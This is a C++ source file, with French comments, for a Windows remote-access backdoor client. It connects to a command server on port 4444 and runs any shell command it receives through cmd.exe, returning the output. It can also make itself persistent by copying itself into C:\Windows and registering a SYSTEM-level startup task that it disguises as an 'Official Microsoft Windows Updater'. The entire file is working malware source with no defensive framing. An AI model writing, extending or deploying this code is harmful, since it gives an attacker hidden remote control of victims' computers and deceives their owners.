#include "utils.h"
#pragma comment(lib, "ws2_32.lib")


using json = nlohmann::json;
using namespace std;

const char* pers = "persistence";



constexpr uint64_t str2int(const char* str, int h = 0)
{
    return !str[h] ? 5381 : (str2int(str, h + 1) * 33) ^ str[h];
}







int EnablePersistence() {
    string finalPath = "C:\\Windows\\windows10H22Updater.exe";
    
    char path[MAX_PATH];

    if (GetModuleFileName(NULL, path, MAX_PATH) != 0) {
        std::cout << "Chemin absolu de l'exécutable: " << path << std::endl;
    }
    else {
        std::cerr << "Impossible d'obtenir le chemin de l'exécutable." << std::endl;
        return -1;
    }

    copyFile(path, finalPath.c_str());



    std::string Execpath = finalPath;
    std::string taskName = "windows10H22Updater";
    std::string description = "Official Microsoft Windows Updater.";
    cout << "Exec PATH:" << Execpath << endl;
    // Assemblez le script PowerShell
    std::string psScript =
        "$Action = New-ScheduledTaskAction -Execute '" + Execpath + "';"
        "$Trigger = New-ScheduledTaskTrigger -AtStartup;"
        "$Principal = New-ScheduledTaskPrincipal -UserId \"SYSTEM\" -LogonType ServiceAccount -RunLevel Highest;"
        "Register-ScheduledTask -TaskName '" + taskName + "' -Description '" + description + "' -Action $Action -Trigger $Trigger -Principal $Principal;";

    // Convertir la commande PowerShell en wstring
    std::wstring psScriptW(psScript.begin(), psScript.end());

    // Préparer la commande complète à exécuter via cmd.exe
    std::wstring fullCommand = L"powershell.exe -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command \"" + psScriptW + L"\"";

    // Structures pour la création du processus
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(STARTUPINFOW));
    si.cb = sizeof(STARTUPINFOW);
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));


    // Exécuter le script PowerShell via CreateProcess
    
    if (!CreateProcessW(NULL, &fullCommand[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
        return -1;
    }

    // Attendre la fin de l'exécution
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Fermer les handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 1;

}




void ExecCmd(SOCKET sock, const std::string& command) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Créer un pipe pour la sortie standard
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        std::cerr << "CreatePipe failed." << std::endl;
        return;
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;



    
    
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    string cmd = "cmd.exe /C " + command;
    
    cout << "COMMAND EXECUTED: " << command << endl;
    // Créer le processus de la commande
    if (!CreateProcess(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "CreateProcess failed." << std::endl;
        CloseHandle(hWrite);
        CloseHandle(hRead);
        return;
    }

    // Attendre que la commande se termine
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Fermer le descripteur d'écriture
    CloseHandle(hWrite);

    // Lire la sortie de la commande
    DWORD dwRead;
    CHAR buffer[4096];
    ZeroMemory(buffer, sizeof(buffer));
    std::string result;

    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &dwRead, NULL) && dwRead > 0) {
        buffer[dwRead] = '\0'; // Assurer la fin de la chaîne
        result += buffer;
    }
    cout << "SORTIE:" << buffer << "; RESULT: "<< result << endl;
    std::wstring wideStr = mbcsToWideString(result);
    std::string utf8Str = wideStringToUtf8(wideStr);
    

    // Envoyer le résultat au serveur
    send(sock, result.c_str(), result.length(), 0);

    // Nettoyage
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}












int main() {
    
        WSADATA wsaData;
        SOCKET sock;
        struct sockaddr_in server_addr;
        const int bufferSize = 1024;
        char buffer[bufferSize];

    while (true) {
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed." << std::endl;
            return 1;
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed." << std::endl;
            WSACleanup();  
            return 1;
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(4444);
        inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            std::cerr << "Connection failed. Error: " << WSAGetLastError() << std::endl;
            closesocket(sock);
            WSACleanup();
            
        }
        else {
            break;
        }
        Sleep(10000);


    }
    





    



    std::cout << "Connected to server. Waiting for commands..." << std::endl;

    while (true) {
        ZeroMemory(buffer, bufferSize);
        int bytesReceived = recv(sock, buffer, bufferSize, 0);
        if (bytesReceived <= 0) {
            std::cout << "Connection closed or error occurred." << std::endl;
            break;
        }
        buffer[bytesReceived] = '\0'; // Ensure null-terminated string
        cout << "buffer: " << buffer << endl;

        // ------------------------------------ PARSING + converting for switch()
        json Command{ json::parse(buffer) };
        
        string Cmd{ Command["command"] };
        auto Args{ Command["args"].get<vector<string>>() };
        const char* cmd_str= Cmd.c_str();
        
        // ------------------------------------




        string persistenceRes = "Persistence Worked!";
        string publicIP;

        constexpr int hash_persistence = str2int("persistence");
        constexpr int hash_cmd = str2int("cmd");

        switch (str2int(cmd_str)) {




        case str2int("persistence"):
            
            if (EnablePersistence()) {
                send(sock, persistenceRes.c_str(), persistenceRes.length(), 0);
            }
            break;

        case str2int("cmd"):
            
            string final="";
            int length = Args.size();
            
            for (int i=0; i < length; i++) {
                
                final.append(Args[i]);
                final.append(" ");
                cout << "append " << Args[i] << " full string: " << final<< endl;

               
               
            }
            cout << "final cmd: " << final << endl;


            

            std::cout << "Executing command: " << final << std::endl;

            // Execute command and potentially send back results
            // Note: Direct execution like this is risky and not recommended for real applications

            ExecCmd(sock, final);


        }

        std::cout << "RECEIVED: " << buffer << std::endl;
        //int result = system(buffer);
        //std::string response = "Command executed with result code: " + std::to_string(result) + "\n";
        //send(sock, response.c_str(), response.length(), 0);

        // Check for a specific exit command if you want a way to gracefully shut down the client
        if (strcmp(buffer, "exit") == 0) {
            std::cout << "Exit command received. Shutting down." << std::endl;
            break;
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
